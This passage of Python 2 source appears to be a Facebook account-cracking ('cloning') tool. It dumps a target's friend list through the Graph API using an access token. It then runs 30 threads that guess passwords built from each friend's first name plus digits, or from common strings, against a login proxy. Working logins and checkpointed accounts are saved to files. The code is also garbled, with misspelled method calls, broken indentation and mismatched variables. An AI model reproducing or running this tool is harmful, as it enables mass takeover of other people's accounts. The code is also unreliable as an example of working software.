                                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass5
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass6
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                	data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass7 + '\n')
                                    ok.close()
                                    oks.append(uid + pass7)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass7
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass7 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass7)
                                else:
                                	data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass8 + '\n')
                                    ok.close()
                                    oks.append(uid + pass8)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass8
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass8 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass8)
                                else:
                                	data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass9 + '\n')
                                    ok.close()
                                    oks.append(uid + pass9)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass9
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass9 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass9)
                                else:
                                	data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass10 + '\n')
                                    ok.close()
                                    oks.append(uid + pass10)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass10
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass10 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass10)

        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[1;93m Press enter to back')
    menu()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Tool Use Login FB Token To Continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m [\033[1;41m Faster Tool Your Choice (Word/Digits (N+D)\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""
    print("")
    print"""╔═━───────────━━━───────────━═╗"""
    print '\x1b[1;92m[A] Faster Tool File cloning'
    print '\x1b[1;94m[B] Back\033[1;0m'
    print"""╚═━───────────━━━───────────━═╝"""
    n_s()

def n_s():
    id = []
    cps = []
    oks = []
    n_s = raw_input("\033[1;32m▄︻̷̿┻̿═━一  ")
    if n_s == 'A':
        os.system('clear')
        print logo
        print """\033[1;97m-----------------------------------------------"""
        print """\033[1;97m [\033[1;41m Faster Tool Your Choice (Word/Digits (N+D)\033[1;0m]""" 
        print """\033[1;97m-----------------------------------------------"""
        print("")
        print """\033[1;97m-----------------------------------------------"""
        print '\x1b[1;93mNme_Pss Example:123-1234-12345-12-786-1122'
        print '\x1b[1;93mPass_For Example:786786-000786-78600-123456'
        print '\x1b[1;93mPass_For Example:Pakistan-pakistan-Lahore'
        print """\033[1;97m-----------------------------------------------"""
        print("")
        
        p1 = raw_input(' \x1b[1;31m[1]Name + digit   \033[1;37m✪✪➛➢ ')
        p2 = raw_input(' \x1b[1;32m[2]Name + digit   \033[1;36m✪✪➛➢ ')
        p3 = raw_input(' \x1b[1;33m[3]Name + digit   \033[1;35m✪✪➛➢ ')
        p4 = raw_input(' \x1b[1;34m[4]Name + digit   \033[1;33m✪✪➛➢ ')
        pass5 = raw_input(' \x1b[1;36m[5]Password       \033[1;32m✪✪➛➢ ')
        pass6 = raw_input(' \x1b[1;35m[6]Password       \033[1;31m✪✪➛➢ ')
        pass7 = raw_input(' \x1b[1;37m[7]Password:      \033[1;33m✪✪➛➢ ')
        pass8 = raw_input(' \x1b[1;31m[8]Password       \033[1;34m✪✪➛➢ ')
        pass9 = raw_input(' \x1b[1;33m[9]Password       \033[1;37m✪✪➛➢ ')
        pass10 = raw_input(' \x1b[1;34m10]Password       \033[1;32m✪✪➛➢ ')
        try:
            idlist = raw_input(' \x1b[1;92mYour File Path/Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('\x1b[1;92mPress Enter To Back. ')
            name_crack()

    elif n_s == 'B':
        menu()
    else:
        print("")
        print("\t "+c+"Your Choice is Wrong(Try Again) "+c2)
        print("")
        name_crack()
    print ' \x1b[1;92mCollecting Total ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;97mBlackFaster Tool is Ready\x1b[1;91m '
    time.sleep(0.5)
    print("")
    os.system('echo -e "\t ცՆค८қ_Բคς੮૯Ր████▒▒100%  " | lolcat')
    time.sleep(0.5)
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m    [\033[1;41m Tool Create  By BlackTiger-Error404\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/TigerOk/Tiger_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass1
                cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass2
                    cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass3
                        cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass4
                            cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass5
                                cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass6
                                    cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass7
                                        cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass8
                                            cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                        	data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                    ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass9 + '\n')
                                    ok.close()
                                    oks.append(uid + pass9)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass9
                                    cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass9 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass9)
                                else:
                                	data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[BlackTiger-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                    ok = open('/sdcard/Tigerids/Tiger_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass10 + '\n')
                                    ok.close()
                                    oks.append(uid + pass10)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;36m[BlackTiger-CP] ' + uid + ' | ' + pass10
                                    cp = open('/sdcard/TigerCp/_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass10 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass10)                                        


        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    os.system('echo -e "-----------------------------------------------"| lolcat')
    print ' \x1b[1;93mTiger Tool Process Complete'
    print ' \x1b[1;92mTotal Ok|\033[1;96mCp:' + str(len(oks)) + '/' + str(len(cps))
    os.system('echo -e "-----------------------------------------------"| lolcat')
    raw_input(' \x1b[1;97mEnjoy Again Press Enter To Back')
    menu()


def digit_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Tool Use Login FB Tokn To Continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m    [\033[1;41m Faster Tool Your Choice (Name+Digits)\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""
    print("")
    print"""╔═━───────────━━━───────────━═╗"""
    print '\x1b[1;92m[A] Faster Tool File cloning'
    print '\x1b[1;94m[B] Back\033[1;0m'
    print"""╚═━───────────━━━───────────━═╝"""
    d_s()

def d_s():
    id = []
    cps = []
    oks = []
    d_s = raw_input("\033[1;32m▄︻̷̿┻̿═━一  ")
    if d_s == 'A':
        os.system('clear')
        print logo
        print """\033[1;97m-----------------------------------------------"""
        print """\033[1;97m    [\033[1;41m Faster Tool Your Choice (Name+Digits)\033[1;0m]""" 
        print """\033[1;97m-----------------------------------------------"""
        print("")
        print """\033[1;97m-----------------------------------------------"""
        print '\x1b[1;93mExample Name + :  12-123-1234-12345-123456'
        print '\x1b[1;93mExample Name + :  1122-786-789-786-333-345'
        print """\033[1;97m-----------------------------------------------"""
        print("")
        
        p1 = raw_input(' \x1b[1;32m[1]Name + digit   \033[1;37m✪✪➛➢  ')
        p2 = raw_input(' \x1b[1;33m[2]Name + digit   \033[1;36m✪✪➛➢  ')
        p3 = raw_input(' \x1b[1;34m[3]Name + digit   \033[1;33m✪✪➛➢  ')
        p4 = raw_input(' \x1b[1;35m[4]Name + digit   \033[1;32m✪✪➛➢  ')
        p5 = raw_input(' \x1b[1;36m[5]Name + digit   \033[1;33m✪✪➛➢  ')
        p6 = raw_input(' \x1b[1;37m[6]Name + digit   \033[1;32m✪✪➛➢  ')
        p7 = raw_input(' \x1b[1;31m[7]Name + digit   \033[1;37m✪✪➛➢  ')
        p8 = raw_input(' \x1b[1;32m[8]Name + digit   \033[1;33m✪✪➛➢  ')
        p9 = raw_input(' \x1b[1;33m[9]Name + digit   \033[1;32m✪✪➛➢  ')
        p10 = raw_input(' \x1b[1;34m10]Name + digit   \033[1;31m✪✪➛➢  ')
        print("")
        try:
            idlist = raw_input(' \x1b[1;92mYour File Path/Name: \x1b[0;97m ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print 'Select Your Right Path/File Not Found.'
            raw_input('\x1b[1;92mPress Enter To Back. ')
            digit_crack()

    elif d_s == 'B':
        menu()
    else:
        print("")
        print("\t "+c+"Your Choice is Wrong(Try Again) "+c2)
        print("")
        digit_crack()
    print ' \x1b[1;92mCollecting Total ids: \x1b[1;92m ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;97mBlackFaster Tool is Ready\x1b[1;91m '
    time.sleep(0.5)
    print("")
    os.system('echo -e "\t ცՆค८қ_Բคς੮૯Ր████▒▒100%  " | lolcat')
    time.sleep(0.5)
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;97m    [\033[1;41m Tool Create  By BlackTiger-Error404\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass1
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass2
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass3
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;34m[JUTT-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name.lower() + p5
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[MUSKI-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[MUSKI-CP] ' + uid + ' | ' + pass5
                                cp = open('HOP_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = name.lower() + p6
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[MUSKI-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[MUSKI-CP] ' + uid + ' | ' + pass6
                                    cp = open('HOP_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = name.lower() + p7
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[MUSKI-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[MUSKI-CP] ' + uid + ' | ' + pass7
                                        cp = open('HOP_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = name.lower() + p8
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[MUSKI-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[MUSKI-CP] ' + uid + ' | ' + pass8
                                            cp = open('HOP_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = name.lower() + p9
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[MUSKI-OK] ' + uid + ' | ' + pass8
                                                ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;93m[MUSKI-CP] ' + uid + ' | ' + pass9
                                                cp = open('HOP_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = name.lower() + p10
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[MUSKI-OK] ' + uid + ' | ' + pass10
                                                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;93m[MUSKI-CP] ' + uid + ' | ' + pass10
                                                    cp = open('HOP_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    menu()


reload(sys)
sys.setdefaultencoding('utf-8')

def ex_id():
    global token
    idg = []
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
    	print '\t    \x1b[1;31mTool Use Login FB Token To Continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("")
    print """\033[1;97m-----------------------------------------------"""
    print """\033[1;37m     [\033[1;41m Faster Tool Collect/Dump Public ID\033[1;0m]""" 
    print """\033[1;97m-----------------------------------------------"""
    print("")
    print """\033[1;36m           Past\033[1;33m Your\033[1;32m Public\033[1;37m ID Link"""
    print("")
    idh = raw_input('\x1b[1;33m ▄︻̷̿┻̿═━一\x1b[0;32m      ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print("")
        print '\x1b[1;37m         Collecting ID: ' + q['name']
        print("")
        os.system('echo -e "\t     ცՆค८қ_Բคς੮૯Ր████▒▒100%  " | lolcat')
    except KeyError:
        print ''
        print '\t    \x1b[1;33mWrong Choice/  ID Cp\x1b[0;97m'
        print ''
        raw_input('\x1b[1;92m Press enter to back')
        menu()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + "|" + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print ''
    print"""\033[1;33m      ╔═━───────────━━━───────────────━═╗\033[0;97m"""
    print '          Faster Tool Process Complete'
    print '\x1b[1;92m          Total Dump ids: ' + str(len(idg))
    print"""\033[1;33m      ╚═━───────────━━━───────────────━═╝\033[0;97m"""
    print ''
    print 47 * '-'
    print ''
    raw_input('\x1b[1;93m Press Enter To Download Your File')
    os.system('cp ids_friends.txt /sdcard/Tiger_Tool.txt')
    os.system('rm -rf ids_friends.txt')
    print '\x1b[1;96m Your File Downloaded Successfully'
    time.sleep(5)
    os.system("clear")
    print logo
    print("")
    print"""\033[1;33m╔═━┳✪✪╤────────────────━━━────────────────✪✪━═╗\033[0;97m"""
    print"""\033[1;37m \033[1;41mSave Your File Chak The (Tiger_Tool.txt) File\033[1;0m"""
    print"""\033[1;33m╚═━┻✪✪╧────────────────━━━────────────────✪✪━═╝\033[0;97m"""
    time.sleep(5)
    menu()
    
if __name__ == '__main__':
    reg()